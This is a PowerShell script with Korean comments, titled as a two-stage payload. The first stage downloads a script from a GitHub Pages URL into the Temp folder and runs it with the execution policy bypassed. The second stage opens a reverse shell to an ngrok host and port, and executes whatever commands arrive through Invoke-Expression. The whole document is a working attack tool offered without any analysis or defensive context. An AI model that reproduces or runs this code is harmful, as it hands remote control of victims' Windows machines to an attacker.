# 이중화 페이로드

# 1단계: PowerShell 스크립트
$payloadUrl = "https://remembermepls.github.io/payload/payload.ps1"
$outputPath = "$env:Temp\payload.ps1"

# 페이로드 다운로드
Invoke-WebRequest -Uri $payloadUrl -OutFile $outputPath

# 다운로드한 페이로드 실행
powershell.exe -ExecutionPolicy Bypass -File $outputPath

# 2단계: 메모리 내에서 실행되는 페이로드 (payload.ps1)
$publicIp = "0.tcp.jp.ngrok.io" # ngrok의 공용 주소
$port = "15800"    # ngrok의 포트 번호

# 리버스 쉘 생성 함수
function Invoke-ReverseShell {
    $client = New-Object System.Net.Sockets.TCPClient($publicIp, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    while ($true) {
        $buffer = New-Object System.Byte[] 1024
        $stream.Read($buffer, 0, $buffer.Length)
        $command = (New-Object Text.ASCIIEncoding).GetString($buffer)
        $output = Invoke-Expression -Command $command 2>&1 | Out-String
        $writer.WriteLine($output)
    }

    $writer.Close()
    $client.Close()
}

# 리버스 쉘 실행
Invoke-ReverseShell
